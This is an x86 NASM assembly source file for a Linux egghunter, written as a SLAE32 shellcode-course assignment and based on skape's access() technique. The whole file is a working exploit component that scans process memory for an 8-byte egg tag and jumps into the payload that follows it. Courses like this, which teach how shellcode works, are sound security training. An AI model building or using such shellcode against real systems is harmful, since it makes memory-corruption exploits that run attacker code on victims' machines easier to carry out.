; hunter.nasm - an example egghunter
; Assignment 3 of SLAE32 course
; 2018-07-04 Thomas Karpiniec

; Egg must be prepended with "\x43\x42\x41\x40\x43\x42\x41\x40"
; This file is for hunter only.
; Based on access() technique described in this paper:
; http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf

global _start

        ; access() syscall, used to determine if a pointer is in mapped memory
        SYS_ACCESS 	equ 33
	; Return value from access() if the address was invalid
	EFAULT	        equ 0xf2

_start:

	; EDX is our potential target
	; Start at 0x1 and search upward byte by byte
	xor edx, edx
	; Set ECX to zero to represent "mode" parameter for access()
	xor ecx, ecx
	
	; Egg header (repeated twice in memory)
	mov esi, 0x40414243
	
loop:
	inc edx
access_check:
	xor eax, eax
	mov al, SYS_ACCESS
	; Check the validity of [edx] and [edx+4] before reading them.
	; Since edx is ascending there shouldn't be any cases where
	; [edx+4] is mapped but [edx] is not - so check [edx+4] only
	lea ebx, [edx+4]
	int 0x80

	; If we didn't get EFAULT go on to looking for the egg header
	cmp al, EFAULT
	jnz short check_address

	; There was a fault. Align EDX with the next page up
	shr edx, 12
	inc edx
	shl edx, 12

	; Start at 0 on the new page
	jmp short access_check

check_address:
	; check the 8 bytes at EDX to see if they container our egg header
	cmp [edx], esi
	jnz short loop
	cmp [edx+4], esi
	jnz short loop

	; They do - let's run the egg
	jmp edx
